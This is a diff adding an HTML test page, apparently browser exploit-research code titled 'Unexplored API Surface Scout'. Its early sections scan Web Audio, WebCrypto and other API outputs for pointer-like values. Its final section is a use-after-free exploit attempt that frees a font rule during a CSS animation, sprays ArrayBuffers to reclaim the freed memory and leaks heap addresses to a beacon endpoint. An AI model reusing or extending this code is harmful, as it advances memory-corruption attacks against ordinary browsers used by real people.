@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1021</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto;}
+.h{color:#f0c040;font-weight:bold;font-size:13px;margin:6px 0 2px;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ff7b47;font-weight:bold;}
+</style>
+</head><body>
+<div id="hud"></div>
+<script>
+'use strict';
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+var HUD=document.getElementById('hud');
+function log(s,c){var d=document.createElement('div');d.className=c||'';d.textContent=s;HUD.appendChild(d);HUD.scrollTop=HUD.scrollHeight;}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1021-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+
+var TS=(Date.now()%100000).toString(36);
+log('P1021: Unexplored API Surface Scout ('+TS+')','h');
+bn('BOOT','ts='+TS);
+
+var R=[];
+
+/* ================================================================
+   A: Web Audio API — create AudioContext, oscillator, analyser
+   Check if internal state is leaked through float arrays
+   ================================================================ */
+log('--- A: Web Audio ---','h');
+try{
+  var AC=window.AudioContext||window.webkitAudioContext;
+  if(!AC)throw new Error('NO');
+  var actx=new AC();
+  R.push('AudioCtx='+actx.state+'|sr='+actx.sampleRate);
+
+  /* Create oscillator + analyser */
+  var osc=actx.createOscillator();
+  var ana=actx.createAnalyser();
+  ana.fftSize=256;
+  osc.connect(ana);ana.connect(actx.destination);
+  osc.start();
+
+  /* Read frequency data after a tiny delay */
+  var fData=new Uint8Array(ana.frequencyBinCount);
+  ana.getByteFrequencyData(fData);
+  var fNZ=0;for(var i=0;i<fData.length;i++)if(fData[i])fNZ++;
+
+  var tData=new Float32Array(ana.frequencyBinCount);
+  ana.getFloatFrequencyData(tData);
+  var tNZ=0,tSamp=[];
+  for(var i=0;i<tData.length;i++){
+    if(tData[i]!==-Infinity&&tData[i]!==0){tNZ++;if(tSamp.length<4)tSamp.push(tData[i].toFixed(2));}
+  }
+
+  /* Check raw buffer for non-audio-like values */
+  var rawBuf=new ArrayBuffer(ana.frequencyBinCount*4);
+  var rawF32=new Float32Array(rawBuf);
+  ana.getFloatFrequencyData(rawF32);
+  var rawBU=new BigUint64Array(rawBuf);
+  var ptrLike=[];
+  for(var i=0;i<rawBU.length;i++){
+    var v=rawBU[i],hi=Number(v>>32n);
+    if(hi>=1&&hi<=0xFF&&v!==0n)ptrLike.push('i'+i+'='+hexQ(v));
+  }
+
+  osc.stop();actx.close();
+  R.push('fNZ='+fNZ+'|tNZ='+tNZ+'|tSamp='+tSamp.join(',')+
+    '|rawPtrs='+ptrLike.length+(ptrLike.length?'|'+ptrLike.slice(0,3).join(';'):''));
+  log('Audio: sr='+actx.sampleRate+' fNZ='+fNZ+' rawPtrs='+ptrLike.length,
+    ptrLike.length>0?'hot':'info');
+}catch(e){
+  R.push('Audio='+e.message);
+  log('Audio: '+e.message,'fail');
+}
+bn('AUDIO',R.join('|'));
+
+/* ================================================================
+   B: Intl API — check for non-standard values or internal state
+   ================================================================ */
+log('--- B: Intl API ---','h');
+var intlR=[];
+try{
+  /* Intl.Collator */
+  var col=new Intl.Collator('en',{sensitivity:'base'});
+  var colOpts=col.resolvedOptions();
+  intlR.push('Col='+JSON.stringify(colOpts).slice(0,120));
+
+  /* Intl.NumberFormat */
+  var nf=new Intl.NumberFormat('en',{style:'decimal',maximumFractionDigits:20});
+  var nfOpts=nf.resolvedOptions();
+  intlR.push('NF='+JSON.stringify(nfOpts).slice(0,120));
+
+  /* formatToParts — might expose internal structure */
+  var parts=nf.formatToParts(12345.6789);
+  intlR.push('parts='+parts.length);
+
+  /* Intl.Segmenter (if available) */
+  try{
+    var seg=new Intl.Segmenter('en',{granularity:'word'});
+    var segs=[...seg.segment('Hello world test')];
+    intlR.push('Seg=Y|n='+segs.length);
+  }catch(e){intlR.push('Seg=N');}
+
+  /* Intl.DisplayNames */
+  try{
+    var dn=new Intl.DisplayNames('en',{type:'region'});
+    intlR.push('DN='+dn.of('US'));
+  }catch(e){intlR.push('DN=N');}
+
+  /* Intl.ListFormat */
+  try{
+    var lf=new Intl.ListFormat('en',{type:'conjunction'});
+    intlR.push('LF='+lf.format(['a','b']));
+  }catch(e){intlR.push('LF=N');}
+
+  /* Check Intl object toString for any internal data */
+  intlR.push('colStr='+String(col).slice(0,50));
+  intlR.push('nfStr='+String(nf).slice(0,50));
+}catch(e){intlR.push('Intl=ERR:'+e.name);}
+bn('INTL',intlR.join('|'));
+log('Intl: '+intlR.slice(0,3).join(' | '),'info');
+
+/* ================================================================
+   C: Crypto.subtle — key generation, exportKey, raw material
+   ================================================================ */
+log('--- C: Crypto ---','h');
+var cryptoR=[];
+try{
+  var cry=crypto.subtle;
+  if(!cry)throw new Error('NO');
+  cryptoR.push('subtle=Y');
+
+  /* Generate ECDH key pair */
+  cry.generateKey({name:'ECDH',namedCurve:'P-256'},true,['deriveBits']).then(function(kp){
+    /* Export public key as raw */
+    return cry.exportKey('raw',kp.publicKey).then(function(raw){
+      var bu=new BigUint64Array(raw);
+      var vals=[];
+      for(var i=0;i<bu.length;i++)vals.push(hexQ(bu[i]));
+      cryptoR.push('ECDHraw='+raw.byteLength+'B|'+vals.join(','));
+
+      /* Check if any exported value looks like a pointer */
+      var ptrs=[];
+      for(var i=0;i<bu.length;i++){
+        var hi=Number(bu[i]>>32n);
+        if(hi>=1&&hi<=0xFF)ptrs.push('i'+i+'='+hexQ(bu[i]));
+      }
+      cryptoR.push('ptrs='+ptrs.length);
+      return cry.exportKey('jwk',kp.publicKey);
+    }).then(function(jwk){
+      cryptoR.push('JWK='+JSON.stringify(jwk).slice(0,200));
+      bn('CRYPTO',cryptoR.join('|'));
+      log('Crypto: '+cryptoR[1],'info');
+      doD();
+    });
+  }).catch(function(e){
+    cryptoR.push('ERR='+e.name+':'+e.message.slice(0,80));
+    bn('CRYPTO',cryptoR.join('|'));
+    doD();
+  });
+}catch(e){
+  cryptoR.push('subtle=N:'+e.message);
+  bn('CRYPTO',cryptoR.join('|'));
+  doD();
+}
+
+/* ================================================================
+   D: IndexedDB + other storage
+   ================================================================ */
+function doD(){
+  log('--- D: Storage APIs ---','h');
+  var storR=[];
+
+  /* IndexedDB */
+  try{
+    var req=indexedDB.open('_test_'+TS,1);
+    var idbDone=false;
+    req.onerror=function(){storR.push('IDB=ERR');if(!idbDone){idbDone=true;finD();}};
+    req.onsuccess=function(e){
+      storR.push('IDB=Y');
+      try{e.target.result.close();indexedDB.deleteDatabase('_test_'+TS);}catch(x){}
+      if(!idbDone){idbDone=true;finD();}
+    };
+    req.onupgradeneeded=function(e){storR.push('IDB-UPG=Y');};
+    req.onblocked=function(){storR.push('IDB=BLOCKED');if(!idbDone){idbDone=true;finD();}};
+    setTimeout(function(){if(!idbDone){idbDone=true;storR.push('IDB=TIMEOUT');finD();}},3000);
+  }catch(e){
+    storR.push('IDB=N:'+e.name);
+    finD();
+  }
+
+  function finD(){
+    /* CacheStorage */
+    try{
+      caches.open('_test_'+TS).then(function(c){
+        storR.push('Cache=Y');
+        return caches.delete('_test_'+TS);
+      }).then(function(){doE(storR);}).catch(function(e){
+        storR.push('Cache=ERR:'+e.name);doE(storR);
+      });
+    }catch(e){
+      storR.push('Cache=N');doE(storR);
+    }
+  }
+}
+
+/* ================================================================
+   E: SVG + MathML availability
+   ================================================================ */
+function doE(storR){
+  log('--- E: SVG/MathML/APIs ---','h');
+  var miscR=[];
+
+  /* SVG SMIL */
+  try{
+    var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+    var rect=document.createElementNS('http://www.w3.org/2000/svg','rect');
+    var anim=document.createElementNS('http://www.w3.org/2000/svg','animate');
+    anim.setAttribute('attributeName','width');
+    anim.setAttribute('from','0');anim.setAttribute('to','100');
+    anim.setAttribute('dur','0.1s');
+    rect.appendChild(anim);svg.appendChild(rect);
+    document.body.appendChild(svg);
+    miscR.push('SVG-SMIL='+typeof anim.beginElement);
+    try{anim.beginElement();miscR.push('SMIL-BEGIN=OK');}catch(e){miscR.push('SMIL-BEGIN='+e.name);}
+    svg.remove();
+  }catch(e){miscR.push('SVG=ERR:'+e.name);}
+
+  /* MathML */
+  try{
+    var math=document.createElementNS('http://www.w3.org/1998/Math/MathML','math');
+    var mi=document.createElementNS('http://www.w3.org/1998/Math/MathML','mi');
+    mi.textContent='x';math.appendChild(mi);
+    document.body.appendChild(math);
+    miscR.push('MathML='+math.offsetHeight+'h');
+    math.remove();
+  }catch(e){miscR.push('MathML=ERR');}
+
+  /* OffscreenCanvas */
+  try{
+    var oc=new OffscreenCanvas(10,10);
+    var ctx=oc.getContext('2d');
+    miscR.push('OffCanvas=Y|ctx='+(ctx?'2d':'null'));
+  }catch(e){miscR.push('OffCanvas=N');}
+
+  /* ResizeObserver */
+  try{
+    var div=document.createElement('div');
+    div.style.width='50px';document.body.appendChild(div);
+    var roFired=false;
+    var ro=new ResizeObserver(function(entries){roFired=true;});
+    ro.observe(div);
+    div.style.width='100px';
+    setTimeout(function(){
+      miscR.push('ResizeObs='+(roFired?'FIRES':'NO'));
+      ro.disconnect();div.remove();
+      doF(storR, miscR);
+    },200);
+  }catch(e){
+    miscR.push('ResizeObs=N');
+    doF(storR, miscR);
+  }
+}
+
+/* ================================================================
+   F: UAF + CSS animation interaction
+   ================================================================ */
+function doF(storR, miscR){
+  log('--- F: UAF + CSS Animation ---','h');
+  bn('STORAGE',storR.join('|'));
+  bn('MISC',miscR.join('|'));
+  log('Storage: '+storR.join(', '),'info');
+  log('Misc: '+miscR.join(', '),'info');
+
+  /* Pre-warm */
+  var pw=[];for(var i=0;i<200;i++)pw.push(new ArrayBuffer(192));pw=null;
+  var gc=[];for(var i=0;i<5000;i++)gc.push(new ArrayBuffer(1024));gc=null;
+
+  /* UAF with CSS animation referencing the freed font */
+  var cssF='ff'+TS, jsF='jf'+TS;
+  var stF=document.createElement('style');
+  stF.textContent=[
+    "@font-face{font-family:"+cssF+";src:local(Arial);unicode-range:U+0042;}",
+    "@keyframes fontSwitch{0%{font-family:serif;font-size:10px;}100%{font-family:"+cssF+";font-size:50px;}}",
+    ".animTarget{animation:fontSwitch 0.05s linear forwards;}"
+  ].join('\n');
+  document.head.appendChild(stF);
+
+  var face=new FontFace(jsF,"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+
+  /* Create animation target BEFORE UAF */
+  var animDiv=document.createElement('div');
+  animDiv.className='animTarget';
+  animDiv.textContent='MEASURE';
+  animDiv.style.cssText='position:absolute;left:-999px;visibility:hidden;';
+  document.body.appendChild(animDiv);
+
+  var fFired=false,fABs=[];
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(fFired)return undefined;fFired=true;
+      stF.remove();stF.textContent='';stF=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray */
+      fABs=[];for(var i=0;i<200;i++)fABs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em '+cssF);}catch(e){}
+      document.body.offsetHeight;
+
+      /* The animation is running and references cssF */
+      /* Force style recalc while animation is active */
+      animDiv.style.width='1px';
+      document.body.offsetHeight;
+      animDiv.style.width='2px';
+      document.body.offsetHeight;
+
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em '+jsF+', '+cssF,'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var fAB=null,fBU=null;
+    for(var i=0;i<fABs.length;i++){
+      var bv=new BigUint64Array(fABs[i]),nz=0;
+      for(var j=0;j<bv.length;j++)if(bv[j]!==0n)nz++;
+      if(nz>=2){fAB=fABs[i];fBU=bv;break;}
+    }
+
+    if(!fAB){bn('F-MISS','200');doFinal();return;}
+
+    var H=fBU[11]-0x68n, q13=fBU[13];
+    bn('F-HIT','H='+hexQ(H)+'|q13='+hexQ(q13));
+    log('UAF HIT: H='+hexQ(H)+' q13='+hexQ(q13),'ok');
+
+    /* Full dump to see if animation wrote anything new */
+    var nzList=[];
+    for(var qi=0;qi<24;qi++){
+      if(fBU[qi]!==0n)nzList.push('q'+qi+'='+hexQ(fBU[qi]));
+    }
+    bn('F-DUMP',nzList.join('|'));
+    log('Fields: '+nzList.join(', '),'info');
+
+    /* Now wait for animation to complete and check again */
+    setTimeout(function(){
+      var nzList2=[];
+      for(var qi=0;qi<24;qi++){
+        if(fBU[qi]!==0n)nzList2.push('q'+qi+'='+hexQ(fBU[qi]));
+      }
+      bn('F-POST-ANIM',nzList2.join('|'));
+
+      /* Check getComputedStyle on the animated element */
+      var cs=getComputedStyle(animDiv);
+      bn('F-COMPUTED','ff='+cs.fontFamily+'|fs='+cs.fontSize);
+
+      animDiv.remove();
+      doFinal();
+    },200);
+  },500);
+}
+
+function doFinal(){
+  log('=== P1021 COMPLETE ===','h');
+  bn('DONE','complete');
+}
+</script>
+</body></html>
